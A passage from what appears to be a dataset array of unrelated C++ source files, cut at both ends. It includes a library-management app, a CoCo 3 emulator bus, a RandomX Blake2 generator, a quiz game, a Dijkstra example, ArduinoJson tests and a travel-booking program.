true;\r\n\t\t\tstd::cout << \"Publication added\" << std::endl;\r\n\t\t}\r\n\t\tstd::cout << std::endl;\r\n\t}\r\n\r\n\tvoid LibApp::removePublication() {\r\n\t\tstd::cout << \"Removing publication from library\" << std::endl;\r\n\t\tsearch();\r\n\t\tif (confirm(\"Remove this publication from the library?\")) {\r\n\t\t\tm_changed = true;\r\n\t\t\tstd::cout << \"Publication removed\" << std::endl << std::endl;\r\n\t\t}\r\n\t}\r\n\r\n\tvoid LibApp::checkOutPub() {\r\n\r\n\t\tsearch();\r\n\t\tif (confirm(\"Check out publication?\")) {\r\n\t\t\tm_changed = true;\r\n\t\t\tstd::cout << \"Publication checked out\" << std::endl <<std::endl;\r\n\t\t}\r\n\t}\r\n\r\n\tLibApp::LibApp():m_mainMenu(\"Seneca Library Application\"),m_exitMenu(\"Changes have been made to the data, what would you like to do?\") {\r\n\r\n\t\tm_changed = false;\r\n\t\tm_mainMenu << \"Add New Publication\";\r\n\t\tm_mainMenu << \"Remove Publication\";\r\n\t\tm_mainMenu << \"Checkout publication from library\";\r\n\t\tm_mainMenu << \"Return publication to library\";\r\n\r\n\t\tm_exitMenu << \"Save changes and exit\";\r\n\t\tm_exitMenu << \"Cancel and go back to the main menu\";\r\n\r\n\t\tload();\r\n\r\n\r\n\t}\r\n\r\n\tvoid LibApp::run() {\r\n\r\n\t\tbool exit = false;\r\n\t\tint selection;\r\n\t\t\r\n\t\tdo{\r\n\t\t\tselection = m_mainMenu.run();\r\n\t\t\t\r\n\t\t\tif (selection == 1)\r\n\t\t\t{\r\n\t\t\t\tnewPublication();\r\n\t\t\t}\r\n\t\t\telse if (selection == 2)\r\n\t\t\t{\r\n\t\t\t\tremovePublication();\r\n\t\t\t}\r\n\t\t\telse if (selection == 3) {\r\n\t\t\t\tcheckOutPub();\r\n\t\t\t}\r\n\t\t\telse if (selection == 4) {\r\n\t\t\t\treturnPub();\t\t\t\t\r\n\t\t\t}\r\n\r\n\t\t} while (selection != 0);\r\n\r\n\t\tif (m_changed) {\r\n\r\n\t\t\tint select = m_exitMenu.run();\r\n\r\n\t\t\tif (select == 1) {\r\n\t\t\t\tsave();\r\n\t\t\t\texit = true;\r\n\t\t\t}\r\n\t\t\telse if (select == 2) {\r\n\t\t\t\tstd::cout << std::endl;\r\n\t\t\t\trun();\r\n\t\t\t}\r\n\t\t\telse if (select == 0)\r\n\t\t\t{\r\n\t\t\t\tif (confirm(\"This will discard all the changes are you sure?\")) {\r\n\t\t\t\t\texit = true;\r\n\t\t\t\t}\r\n\t\t\t\telse\r\n\t\t\t\t{\r\n\t\t\t\t\trun();\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n\t\telse {\r\n\t\t\texit = true;\r\n\t\t}\r\n\r\n\t\tif (exit) {\r\n\t\t\tstd::cout << std::endl << \"-------------------------------------------\" << std::endl;\r\n\t\t\tstd::cout << \"Thanks for using Seneca Library Application\" << std::endl;\r\n\t\t}\r\n\t\t\r\n\r\n\t}\r\n\r\n}//Seneca\r\n",
    "#include \"GimeBus.h\"\r\n#include \"CoCo3EmuPGE.h\"\r\n#include <conio.h>\r\n#include <ctime>\r\n\r\nGimeBus::GimeBus()\r\n{\r\n\t// Setup initial RAM state\r\n\tstd::srand(std::time(0));\t\t\t\t\t\t\t\t// Seed the pseudo-random number generator\r\n\tSetRAMSize(512);\t\t\t\t\t\t\t\t\t\t// Emulator should default to stock CoCo 3 which has 128KB RAM\r\n\r\n\t//offscreenBuffer.resize(640 * 480 * sizeof(olc::Pixel));\r\n\r\n\tcpu.ConnectToBus(this);\r\n\tdiskController.ConnectToBus(this);\r\n\temuDiskDriver.ConnectToBus(this);\r\n\t//serial.ConnectToBus(this);\r\n\r\n\t// Joysticks state setup\r\n\tjoystickDevice[JOYSTICK_PORT_RIGHT].portName = \"RIGHT\";\r\n\tjoystickDevice[JOYSTICK_PORT_LEFT].portName = \"LEFT\";\r\n\t\r\n\t// Setup GIME registers initial states\r\n\tgimeAllRamModeEnabled = false;\t\t\t\t\t\t\t// Initial state has ROM mapped into memory\r\n\t// Init 0 setup\r\n\tgimeRegInit0.cocoCompatMode = false;\r\n\tgimeRegInit0.mmuEnabled = false;\r\n\tgimeRegInit0.chipIRQEnabled = false;\t\t\t\t\t// Default to GIME IRQs being disabled\r\n\tgimeRegInit0.chipFIRQEnabled = false;\t\t\t\t\t// Default to GIME FIRQs being disabled\r\n\tgimeRegInit0.constSecondaryVectors = false;\r\n\tgimeRegInit0.scsEnabled = false;\r\n\tgimeRegInit0.romMapControl = 0x00;\r\n\t// Init 1 setup\r\n\tgimeRegInit1.memoryType = false;\r\n\tgimeRegInit1.timerSourceFast = false;\t\t\t\t\t// False = 63.695 usec\r\n\tgimeRegInit1.mmuTaskSelect = 0x00;\t\t\t\t\t\t// 0 = 0xFFA0-0xFFA7 (Task 0)\r\n\r\n\tgimeHorizontalOffsetReg.offsetAddress = 0;\r\n\tgimeHorizontalOffsetReg.hven = false;\r\n\r\n\tgimeBlinkStateOn = false;\r\n\r\n\tgimeRegIRQtypes = 0x00;\r\n\tgimeRegFIRQtypes = 0x00;\r\n\r\n\tsamPageSelectReg = 0x00;\r\n\tvdgVideoConfig.gfxModeEnabled = false;\r\n\tvdgVideoConfig.fontIsExternal = false;\r\n\r\n\t// One CPU clock occurs for every 4 NTSC video color burst clock cycles, and one video color burst cycle occurs for every 8 (GIME) Master Clock cycles.\r\n\t// CoCo 3's power-up clock speed is ~0.89 MHz (slow-mode), so with the cycle scaling described above, 1 (slow-mode) CPU clock tick happens every 32 GIME Master clock cycles\r\n\tcpuClockDivisor = 32;\r\n\tmasterBusCycleCounter = 0;\r\n\tscanlineCounter = 0;\r\n\tdotCounter = 0;\r\n\tfloppySeekIntervalCounter = 0;\r\n\tfloppyAccessIntervalCounter = 0;\r\n\r\n\temuInfoTextIndex = -3;\r\n}\r\n\r\nvoid GimeBus::SetRAMSize(int sizeInKB)\r\n{\r\n\tramTotalSizeKB = sizeInKB;\r\n\tramSizeMask = (sizeInKB * 1024) - 1;\r\n\tphysicalRAM.resize(sizeInKB * 1024);\r\n\tprintf(\"CoCo 3 RAM Size set to %u bytes.\\n\", (unsigned int)physicalRAM.size());\r\n\t// Init all the physical RAM to random values which is what happens on real hardware\r\n\t//for (int i = 0; i < (sizeInKB * 1024); i++)\r\n\t//\tphysicalRAM[i] = std::rand() % 256;\r\n\tuint8_t blankByte = 0x00;\r\n\tfor (uint32_t i = 0; i < (sizeInKB * 1024); i++)\r\n\t{\r\n\t\tif ((i % 4) == 0)\r\n\t\t\tblankByte = ~blankByte;\r\n\t\tphysicalRAM[i] = blankByte;\r\n\t}\r\n}\r\n\r\nvoid GimeBus::gimeBusClockTick()\r\n{\r\n\t// Check if we are at falling edge of Field Sync which occurs at scanline dot 1422 on scanline 230\r\n\tif ((dotCounter == 1422) && (scanlineCounter == 230))\r\n\t{\r\n\t\tdevPIA0.SideB.controlReg |= 0x80;\r\n\t\tif ((devPIA0.SideB.controlReg & PIA_CTRL_IRQENABLE_MASK) && !(devPIA0.SideB.controlReg & PIA_CTRL_IRQEDGE_MASK))\r\n\t\t\tcpu.assertedInterrupts[INT_IRQ] |= INT_ASSERT_MASK_PIA_VSYNC;\r\n\t}\r\n\tdotCounter++;\r\n\tmasterBusCycleCounter++;\r\n\r\n\tif (diskController.isConnected)\r\n\t{\r\n\t\t// Check if the emulated disk is spinning, and if so, emulate the state of the Index Pulse\r\n\t\tif (diskController.fdcMotorOn)\r\n\t\t{\r\n\t\t\tfloppyIndexHoleCounter++;\r\n\t\t\t// Set the internal Floppy Index Pulse state if we are at the right points in the counter/rotation\r\n\t\t\tif (floppyIndexHoleCounter >= gimePerFloppyRotation)\r\n\t\t\t{\r\n\t\t\t\tdiskController.fdcIndexPulse = false;\r\n\t\t\t\tfloppyIndexHoleCounter = 0;\t\t// If the emulated floppy has completed one complete rotation (assuming 300 rpm), then reset our counter until next Index Pulse will occur\r\n\t\t\t}\r\n\t\t\telse if (floppyIndexHoleCounter >= (gimePerFloppyRotation - gimeFloppyIndexWidth))\r\n\t\t\t\tdiskController.fdcIndexPulse = true;\r\n\t\t}\r\n\r\n\t\tif (diskController.fdcPendingCommand != FDC_OP_NONE)\r\n\t\t{\r\n\t\t\t// Check if we are processing a \"Type I\" floppy head-stepping related command and handle it if so\r\n\t\t\tif ((diskController.fdcPendingCommand >= FDC_OP_RESTORE) && (diskController.fdcPendingCommand <= FDC_OP_STEP_OUT))\r\n\t\t\t{\r\n\t\t\t\t// Copy internal Floppy Index Pulse state from internal variable to FDC Status Register (Bit 1)\r\n\t\t\t\tif (diskController.fdcIndexPulse)\r\n\t\t\t\t\tdiskController.fdcStatusReg |= FDC_STATUS_I_INDEX;\r\n\t\t\t\telse\r\n\t\t\t\t\tdiskController.fdcStatusReg &= ~FDC_STATUS_I_INDEX;\r\n\r\n\t\t\t\tfloppySeekIntervalCounter++;\r\n\t\t\t\tif (floppySeekIntervalCounter > 28636)\r\n\t\t\t\t{\r\n\t\t\t\t\t// 28636 GIME cycles approximately works out to be 1 millisecond in real-time, which we can use to time our floppy head-stepping rate\r\n\t\t\t\t\tfloppySeekIntervalCounter = 0;\r\n\t\t\t\t\tif (diskController.fdcHandleNextEvent() == FD502_OPERATION_COMPLETE)\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tdiskController.fdcHaltFlag = false;\r\n\t\t\t\t\t\tif (diskController.fdcDoubleDensity)\r\n\t\t\t\t\t\t\tcpu.assertedInterrupts[INT_NMI] |= INT_ASSERT_MASK_NMI;\t\t// NMI is only asserted when ",
    "/*\nCopyright (c) 2018-2019, tevador <tevador@gmail.com>\n\nAll rights reserved.\n\nRedistribution and use in source and binary forms, with or without\nmodification, are permitted provided that the following conditions are met:\n\t* Redistributions of source code must retain the above copyright\n\t  notice, this list of conditions and the following disclaimer.\n\t* Redistributions in binary form must reproduce the above copyright\n\t  notice, this list of conditions and the following disclaimer in the\n\t  documentation and/or other materials provided with the distribution.\n\t* Neither the name of the copyright holder nor the\n\t  names of its contributors may be used to endorse or promote products\n\t  derived from this software without specific prior written permission.\n\nTHIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\" AND\nANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED\nWARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE\nDISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE\nFOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL\nDAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR\nSERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER\nCAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,\nOR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE\nOF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n*/\n\n#include <stddef.h>\n#include \"blake2/blake2.h\"\n#include \"blake2/endian.h\"\n#include \"blake2_generator.hpp\"\n\nnamespace randomx {\n\n\tconstexpr int maxSeedSize = 60;\n\n\tBlake2Generator::Blake2Generator(const void* seed, size_t seedSize, int nonce) : dataIndex(sizeof(data)) {\n\t\tmemset(data, 0, sizeof(data));\n\t\tmemcpy(data, seed, seedSize > maxSeedSize ? maxSeedSize : seedSize);\n\t\tstore32(&data[maxSeedSize], nonce);\n\t}\n\n\tuint8_t Blake2Generator::getByte() {\n\t\tcheckData(1);\n\t\treturn data[dataIndex++];\n\t}\n\n\tuint32_t Blake2Generator::getUInt32() {\n\t\tcheckData(4);\n\t\tauto ret = load32(&data[dataIndex]);\n\t\tdataIndex += 4;\n\t\treturn ret;\n\t}\n\n\tvoid Blake2Generator::checkData(const size_t bytesNeeded) {\n\t\tif (dataIndex + bytesNeeded > sizeof(data)) {\n\t\t\tblake2b(data, sizeof(data), data, sizeof(data), nullptr, 0);\n\t\t\tdataIndex = 0;\n\t\t}\n\t}\n}",
    "#include <iostream>\n#include \"Utilities.h\"\nnamespace seneca\n{\n\tchar Utilities::m_delimiter = ',';\n\n\tvoid Utilities::setDelimiter(char delimiter)\n\t{\n\t\tm_delimiter = delimiter;\n\t}\n\n\tchar Utilities::getDelimiter()\n\t{\n\t\treturn m_delimiter;\n\t}\n\n\tvoid Utilities::setFieldWidth(size_t width)\n\t{\n\t\tm_fieldWidth = width;\n\t}\n\tsize_t Utilities::getFieldWidth() const\n\t{\n\t\treturn m_fieldWidth;\n\t}\n\n\t//std::string Utilities::trim(std::string str)\n\t//{\n\t//\tsize_t last = str.find_last_not_of(' ');\n\t//\tsize_t first = str.find_first_not_of(' ');\n\t//\tif (first == std::string::npos)\n\t//\t{\n\t//\t\treturn str;\n\t//\t}\n\t//\treturn str.substr(first, (last - first + 1));\n\t//}\n\n\tstd::string Utilities::trim(std::string& s) {\n\t\tstd::string temp{};\n\n\t\tsize_t p = s.find_first_not_of(\" \\t\");\n\t\ts.erase(0, p);\n\n\t\tp = s.find_last_not_of(\" \\t\");\n\t\tif (std::string::npos != p) {\n\t\t\ttemp = s.erase(p + 1);\n\t\t}\n\t\treturn temp;\n\t}\n\n\n\tstd::string Utilities::extractToken(const std::string& str, size_t& next_pos, bool& more) {\n\t\tstd::string token{}, restStr{};\n\t\tsize_t n{};\n\n\t\tif (more) {\n\t\t\tn = str.find(m_delimiter, next_pos);\n\n\t\t\tif (n != std::string::npos) {\n\t\t\t\tif (n == next_pos) {\n\t\t\t\t\tmore = false;\n\t\t\t\t\tthrow \"Error! A delimiter is found at next_pos\";\n\t\t\t\t}\n\t\t\t\telse {\n\t\t\t\t\ttoken = str.substr(next_pos, (n - next_pos));\n\t\t\t\t\ttoken = trim(token);\n\n\t\t\t\t\tnext_pos = n + 1;\n\t\t\t\t\tstr[n] == '\\n' ? more = false : more = true;\n\t\t\t\t}\n\t\t\t}\n\t\t\telse {\n\t\t\t\tmore = false;\n\t\t\t\ttoken = str.substr(next_pos);\n\t\t\t\ttoken = trim(token);\n\t\t\t}\n\n\t\t\tif (m_fieldWidth < token.length()) {\n\t\t\t\tm_fieldWidth = token.length();\n\t\t\t}\n\t\t}\n\t\treturn token;\n\t}\n\n}",
    "#include<iostream>\n#include<cstdlib>\n#include<cstdio>\n#include<ctime>\n#include<cstring>\n#include<fstream>\n#include<conio.h>\n#include<windows.h>\n\nusing namespace std;\n\nint numeroPreguntas = 15;\nint numeroOpciones = 5;\n\nvoid borrar(int a, int b)\n{\n    fflush(stdin);\n    for(int i=a; i<=b; i++)\n    {\n        gotoxy(1, i);\n        clreol();\n    }\n    fflush(stdin);\n}\n\nvoid cargando()\n{\n\tclrscr();\n\tint segundos=5;\n    for(int i=0; i<=21; i++)\n    gotoxy(1, 10);\n    cout << \"\\t\\t\\t\\t   CARGANDO...\";\n    gotoxy(1, 11);\n    for(int i=0; i<=79; i++)\n        cout << \"_\";\n    for(int i=0; i<=79; i++)\n    {\n        cout<<char(219);\n        Sleep(segundos*1000/80);\n    }\n    cout<<\"\\nCompletado!\";\n}\n\nstring* guardarDato(string buffer, int size, int partes)\n{\n    string *dato=new string[size];\n    char *aux = new char[buffer.length() + 1];\n    strcpy(aux, buffer.c_str());\n    int i=0;\n    dato[i] = strtok(aux, \",\");\n    for(int j=0; j<=partes-1; j++)\n    {\n        dato[++i] = strtok(NULL, \",\");\n    }\n    return dato;\n}\n\nint* vectorAleatorio(int size, int a, int b)\n{\n    int *vector=new int[size], aux;\n    for(int i=0; i<=size-1; i++)\n    {\n        aux = (a+(rand()%(b - a + 1)));\n        if(i > 0)\n        {\n            for(int j=0; j<i; j++)\n            {\n                if(vector[j] == aux)\n                {\n                    aux = (a+(rand()%(b - a + 1)));\n                    j=-1;\n                }\n            }\n        }\n        vector[i] = aux;\n    }\n    return vector;\n}\n\nchar* convertir(string *datos)\n{\n\tchar *resp=new char[numeroPreguntas];\n\tfor(int i=0; i<=numeroPreguntas-1; i++)\n\t{\n\t\tresp[i] = datos[i].at(0);\n\t}\n\treturn resp;\n}\n\nbool comprobarLetra(char letra)\n{\n\tif(letra=='a' || letra=='b'\t|| letra=='c' || letra=='d')\n\t{\n\t\treturn true;\n\t}\n\telse\n\t{\n\t\treturn false;\n\t}\n}\n\nbool comprobarResp(char op, char respuesta)\n{\n\tif(op == respuesta)\n\t{\n\t\treturn true;\n\t}\n\telse\n\t{\n\t\treturn false;\n\t}\n}\n\nvoid espacioResp(int pos)\n{\n\tif(pos == 1)\n\t{\n\t\tgotoxy(17, 8);\n\t}\n\telse if(pos == 2)\n\t{\n\t\tgotoxy(50, 8);\n\t}\n\telse if(pos == 3)\n\t{\n\t\tgotoxy(17, 11);\n\t}\n\telse if(pos == 4)\n\t{\n\t\tgotoxy(50, 11);\n\t}\n}\n\nvoid mostrar(string datos[])\n{\n\tfor(int j=0; j<=4; j++)\n    {\n        if(j==0)\n        {\n        \tgotoxy(4, 5);\n            cout<<datos[0];\n        }\n        else\n        {\n        \tespacioResp(j);\n            cout<<datos[j];\n        }\n    }\n}\n\nint ubicar(string resp[], char op)\n{\n\tint i=0;\n\tif(op == 'a')\n\t{\n\t\ti = 1;\n\t}\n\telse if(op == 'b')\n\t{\n\t\ti = 2;\n\t}\n\telse if(op == 'c')\n\t{\n\t\ti = 3;\n\t}\n\telse if(op == 'd')\n\t{\n\t\ti = 4;\n\t}\n\treturn i;\n}\n\nvoid seleccionarRespuesta(string res[], char op)\n{\n\tint i=ubicar(res, op);\n\ttextcolor(2);\n\tespacioResp(i);\n\tcout<<res[i];\n\tSleep(250);\n\ttextcolor(4);\n\tespacioResp(i);\n\tcout<<res[i];\n\tSleep(250);\n}\n\nvoid mostrarCorrecta(bool res, string resp[], char op)\n{\n\tint i=ubicar(resp, op);\n\tborrar(8, 11);\n\tespacioResp(i);\n\tif(res)\n\t{\n\t\ttextcolor(2);\n\t}\n\telse\n\t{\n\t\ttextcolor(4);\n\t}\n\tcout<<resp[i]<<endl;\n}\n\nvoid mostrarResultado(bool op, int dineroC, int dineroI)\n{\n\tif(op)\n\t{\n\t\tborrar(21, 24);\n\t\tgotoxy(22, 20);\n\t\tcout<<\"\\tR E S P U E S T A   C O R R E C T A  ! ! ! \";\n\t\tgotoxy(22, 21);\n\t\tcout<<\"\\t C O N T I N U A   E L   J U E G O  ! ! !\";\n\t\tgotoxy(22, 22);\n\t\tcout<<\"\\t   D I N E R O   G A N A D O :   \"<<dineroC;\n\t}\n\telse\n\t{\n\t\tborrar(21, 24);\n\t\tgotoxy(22, 20);\n\t\tcout<<\"\\tR E S P U E S T A   I N C O R R E C T A  ! ! !\";\n\t\tgotoxy(22, 21);\n\t\tcout<<\"\\t    F I N   D E L    J U E G O  ! ! ! \";\n\t\tgotoxy(22, 22);\n\t\tcout<<\"\\t   D I N E R O   G A N A D O :   \"<<dineroI;\n\t}\n\tfflush(stdin);\n\tcin.get();\n}\n\nvoid mostrarComodines(string com[])\n{\n\tborrar(12, 24);\n\tgotoxy(1, 14);\n\tcout<<\"D E S E A   U S A R   U N   C O M O D I N   ? ? ? (s/n)\";\n\tgotoxy(17, 17);\n\tcout<<com[0];\n\tgotoxy(50, 17);\n\tcout<<com[1];\n\tgotoxy(40, 20);\n\tcout<<com[2];\n\tgotoxy(57, 14);\n}\n\nchar leerComodines(char correcta, int op)\n{\n\tstring com[3] = {\"**1) LLAMADA TELEFONICA**\", \"**2) AYUDA DEL PUBLICO**\", \"**3) 50 / 50**\"};\n\tchar opciones[4]={'a', 'b', 'c', 'd'}, final, opFinal;\n\tint opinion[4], sum=0, numFinal=0;\n\tborrar(13, 24);\n\tgotoxy(1, 14);\n\tcout<<\"H A   S E L E C C I O N A D O :  \"<<com[op-1];\n\tif(op == 1)\n\t{\n\t\tfor(int i=0; i<=4; i++)\n\t\t{\n\t\t\tborrar(15, 24);\n\t\t\tgotoxy(5, 16);\n\t\t\tcout<<\"M A R C A N D O\";\n\t\t\tfor(int i=0; i<=3; i++)\n\t\t\t{\n\t\t\t\tcout<<'.';\n\t\t\t\tSleep(250);\n\t\t\t}\n\t\t}\n\t\tgotoxy(3, 18);\n\t\tfinal = opciones[0+(rand()%(3 - 0 + 1))];\n\t\tcout<<\"NO ESTOY MUY SEGURO, OPINO QUE ES LA \"<<final;\n\t}\n\telse if(op == 2)\n\t{\n\t\tfor(int i=0; i<=4; i++)\n\t\t{\n\t\t\tborrar(15, 24);\n\t\t\tgotoxy(5, 16);\n\t\t\tcout<<\"R E A L I Z A N D O   E N C U E S T A\";\n\t\t\tfor(int i=0; i<=3; i++)\n\t\t\t{\n\t\t\t\tcout<<'.';\n\t\t\t\tSleep(250);\n\t\t\t}\n\t\t}\n\t\tgotoxy(3, 18);\n\t\tfor(int i=0; i<=3; i++)\n\t\t{\n\t\t\tif(i==3)\n\t\t\t{\n\t\t\t\topinion[i] = 100-sum;\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\topinion[i] = 1+(rand()%(33 - 1 + 1));\n\t\t\t\tsum = sum+opinion[i];\n\t\t\t}\n\t\t\tif(opinion[i] > numFinal)\n\t\t\t{\n\t\t\t\tnumFinal = i;\n\t\t\t}\n\t\t}\n\t\tcout<<\"EL PUBLICO HA OPINADO :\"<<endl;\n\t\tfor(int i=0; i<=3; i++)\n\t\t{\n\t\t\tcout<<\"\\t\"<<opciones[i]<<\" : \"<<opinion[i]<<\" %\"<<endl",
    "/* https://www.geeksforgeeks.org/dijkstras-shortest-path-algorithm-greedy-algo-7/\nC++ program for Dijkstra's single source shortest path algorithm. The program is for adjacency matrix representation of the graph\n*/\n#include <bits/stdc++.h>\nusing namespace std;\n\n// Define INF as a large value to represent infinity\n#define INF 0x3f3f3f3f\n\n// iPair ==> Integer Pair\ntypedef pair<int, int> iPair;\n\n// Class representing a graph using adjacency list representation\nclass Graph {\n    int V; // Number of vertices\n    list<iPair> *adj; // Adjacency list\n\npublic:\n    Graph(int V); // Constructor\n\n    void addEdge(int u, int v, int w); // Function to add an edge\n    void shortestPath(int s); // Function to print shortest path from source\n};\n\n// Constructor to allocate memory for the adjacency list\nGraph::Graph(int V) {\n    this->V = V;\n    adj = new list<iPair>[V];\n}\n\n// Function to add an edge to the graph\nvoid Graph::addEdge(int u, int v, int w) {\n    adj[u].push_back(make_pair(v, w));\n    adj[v].push_back(make_pair(u, w)); // Since the graph is undirected\n}\n\n// Function to print shortest paths from source\nvoid Graph::shortestPath(int src) {\n    // Create a priority queue to store vertices being processed\n    // Priority queue sorted by the first element of the pair (distance)\n    priority_queue<iPair, vector<iPair>, greater<iPair>> pq;\n\n    // Create a vector to store distances and initialize all distances as INF\n    vector<int> dist(V, INF);\n\n    // Insert source into priority queue and initialize its distance as 0\n    pq.push(make_pair(0, src));\n    dist[src] = 0;\n\n    // Process the priority queue\n    while (!pq.empty()) {\n        // Get the vertex with the minimum distance\n        int u = pq.top().second;\n        pq.pop();\n\n        // Iterate through all adjacent vertices of the current vertex\n        for (auto &neighbor : adj[u]) {\n            int v = neighbor.first;\n            int weight = neighbor.second;\n\n            // If a shorter path to v is found\n            if (dist[v] > dist[u] + weight) {\n                // Update distance and push new distance to the priority queue\n                dist[v] = dist[u] + weight;\n                pq.push(make_pair(dist[v], v));\n            }\n        }\n    }\n\n    // Print the shortest distances\n    cout << \"Vertex Distance from Source\" << endl;\n    for (int i = 0; i < V; ++i)\n        cout << i << \" \\t\\t \" << dist[i] << endl;\n}\n\n// Driver's code\nint main() {\n    int V = 9; // Number of vertices\n    Graph g(V);\n\n    // Add edges to the graph\n    g.addEdge(0, 1, 4);\n    g.addEdge(0, 7, 8);\n    g.addEdge(1, 2, 8);\n    g.addEdge(1, 7, 11);\n    g.addEdge(2, 3, 7);\n    g.addEdge(2, 8, 2);\n    g.addEdge(2, 5, 4);\n    g.addEdge(3, 4, 9);\n    g.addEdge(3, 5, 14);\n    g.addEdge(4, 5, 10);\n    g.addEdge(5, 6, 2);\n    g.addEdge(6, 7, 1);\n    g.addEdge(6, 8, 6);\n    g.addEdge(7, 8, 7);\n\n    // Call the shortestPath function\n    g.shortestPath(0);\n\n    return 0;\n}\n\n",
    "// ArduinoJson - https://arduinojson.org\n// Copyright \u00a9 2014-2024, Benoit BLANCHON\n// MIT License\n\n#include <catch.hpp>\n#include <limits>\n#include <string>\n\n#include <ArduinoJson/Json/TextFormatter.hpp>\n#include <ArduinoJson/Serialization/Writer.hpp>\n\nusing namespace ArduinoJson::detail;\n\ntemplate <typename T>\nvoid checkWriteInteger(T value, std::string expected) {\n  char output[64] = {0};\n  StaticStringWriter sb(output, sizeof(output));\n  TextFormatter<StaticStringWriter> writer(sb);\n  writer.writeInteger<T>(value);\n  REQUIRE(expected == output);\n  REQUIRE(writer.bytesWritten() == expected.size());\n}\n\nTEST_CASE(\"int8_t\") {\n  checkWriteInteger<int8_t>(0, \"0\");\n  checkWriteInteger<int8_t>(-128, \"-128\");\n  checkWriteInteger<int8_t>(127, \"127\");\n}\n\nTEST_CASE(\"uint8_t\") {\n  checkWriteInteger<uint8_t>(0, \"0\");\n  checkWriteInteger<uint8_t>(255, \"255\");\n}\n\nTEST_CASE(\"int16_t\") {\n  checkWriteInteger<int16_t>(0, \"0\");\n  checkWriteInteger<int16_t>(-32768, \"-32768\");\n  checkWriteInteger<int16_t>(32767, \"32767\");\n}\n\nTEST_CASE(\"uint16_t\") {\n  checkWriteInteger<uint16_t>(0, \"0\");\n  checkWriteInteger<uint16_t>(65535, \"65535\");\n}\n\nTEST_CASE(\"int32_t\") {\n  checkWriteInteger<int32_t>(0, \"0\");\n  checkWriteInteger<int32_t>(-2147483647 - 1, \"-2147483648\");\n  checkWriteInteger<int32_t>(2147483647, \"2147483647\");\n}\n\nTEST_CASE(\"uint32_t\") {\n  checkWriteInteger<uint32_t>(0, \"0\");\n  checkWriteInteger<uint32_t>(4294967295U, \"4294967295\");\n}\n",
    "#include <iostream>\r\n#include <string>\r\n#include <limits>\r\n#include <cstddef>\r\n\r\nusing namespace std;\r\n\r\nstruct Pelanggan {\r\n    string nama;\r\n    string email;\r\n    string nomorTelepon;\r\n    string alamat;\r\n    Pelanggan* next;\r\n};\r\n\r\nstruct Perjalanan {\r\n    string namaPerjalanan;\r\n    string tujuan;\r\n    string tanggal;\r\n    int harga;\r\n    Perjalanan* next;\r\n};\r\n\r\nstruct Pemesanan {\r\n    Pelanggan pelanggan;\r\n    Perjalanan perjalanan;\r\n    string tanggalPemesanan;\r\n    string status;\r\n    Pemesanan* next;\r\n};\r\n\r\nstruct Pembayaran {\r\n    Pemesanan pemesanan;\r\n    string tanggalPembayaran;\r\n    int jumlah;\r\n    Pembayaran* next;\r\n};\r\n\r\nvoid clearInputBuffer() {\r\n    cin.clear();\r\n    cin.ignore(numeric_limits<streamsize>::max(), '\\n');\r\n}\r\n\r\nvoid create(Pelanggan*& headPelanggan, Perjalanan*& headPerjalanan, Pemesanan*& headPemesanan, Pembayaran*& headPembayaran) {\r\n    int pilihan;\r\n    cout << \"Create apa?\" << endl;\r\n    cout << \"1. Pelanggan\" << endl;\r\n    cout << \"2. Perjalanan\" << endl;\r\n    cout << \"3. Pemesanan\" << endl;\r\n    cout << \"4. Pembayaran\" << endl;\r\n    cout << \"Masukkan pilihan: \";\r\n    cin >> pilihan;\r\n    clearInputBuffer();\r\n\r\n    switch (pilihan) {\r\n        case 1: {\r\n            Pelanggan* newNode = new Pelanggan;\r\n            cout << \"Masukkan nama pelanggan: \";\r\n            getline(cin, newNode->nama);\r\n            cout << \"Masukkan email pelanggan: \";\r\n            getline(cin, newNode->email);\r\n            cout << \"Masukkan nomor telepon pelanggan: \";\r\n            getline(cin, newNode->nomorTelepon);\r\n            cout << \"Masukkan alamat pelanggan: \";\r\n            getline(cin, newNode->alamat);\r\n            newNode->next = headPelanggan;\r\n            headPelanggan = newNode;\r\n            break;\r\n        }\r\n        case 2: {\r\n            Perjalanan* newNode = new Perjalanan;\r\n            cout << \"Masukkan nama perjalanan: \";\r\n            getline(cin, newNode->namaPerjalanan);\r\n            cout << \"Masukkan tujuan perjalanan: \";\r\n            getline(cin, newNode->tujuan);\r\n            cout << \"Masukkan tanggal perjalanan: \";\r\n            getline(cin, newNode->tanggal);\r\n            cout << \"Masukkan harga perjalanan: \";\r\n            cin >> newNode->harga;\r\n            clearInputBuffer();\r\n            newNode->next = headPerjalanan;\r\n            headPerjalanan = newNode;\r\n            break;\r\n        }\r\n        case 3: {\r\n            Pemesanan* newNode = new Pemesanan;\r\n            cout << \"Masukkan nama pelanggan: \";\r\n            getline(cin, newNode->pelanggan.nama);\r\n            cout << \"Masukkan nama perjalanan: \";\r\n            getline(cin, newNode->perjalanan.namaPerjalanan);\r\n            cout << \"Masukkan tanggal pemesanan: \";\r\n            getline(cin, newNode->tanggalPemesanan);\r\n            cout << \"Masukkan status pemesanan: \";\r\n            getline(cin, newNode->status);\r\n            newNode->next = headPemesanan;\r\n            headPemesanan = newNode;\r\n            break;\r\n        }\r\n        case 4: {\r\n            Pembayaran* newNode = new Pembayaran;\r\n            cout << \"Masukkan nama pelanggan: \";\r\n            getline(cin, newNode->pemesanan.pelanggan.nama);\r\n            cout << \"Masukkan nama perjalanan: \";\r\n            getline(cin, newNode->pemesanan.perjalanan.namaPerjalanan);\r\n            cout << \"Masukkan tanggal pembayaran: \";\r\n            getline(cin, newNode->tanggalPembayaran);\r\n            cout << \"Masukkan 